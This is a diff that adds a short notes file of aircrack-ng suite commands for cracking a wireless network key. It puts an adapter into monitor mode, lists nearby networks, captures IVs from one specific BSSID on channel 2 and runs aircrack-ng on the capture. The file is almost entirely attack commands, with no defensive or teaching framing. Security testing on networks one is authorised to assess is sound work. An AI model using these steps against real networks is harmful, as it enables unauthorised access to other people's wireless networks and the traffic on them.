@@ -1,0 +1,11 @@
+: To start monitor mode :
+-iwconfig
+-ifconfig wlan0 down
+-airmon-ng check kill (not mandatory)
+-airmon-ng start wlan0
+: To fetch networks :
+airodump-ng wlan0mon
+: To get iv as many as possible to crack the key of the wireless network:
+airodump-ng --bssid  C4:0B:CB:67:7E:87 --channel 2 --write file wlan0mon
+:start cracking:
+aircrack-ng file.cap
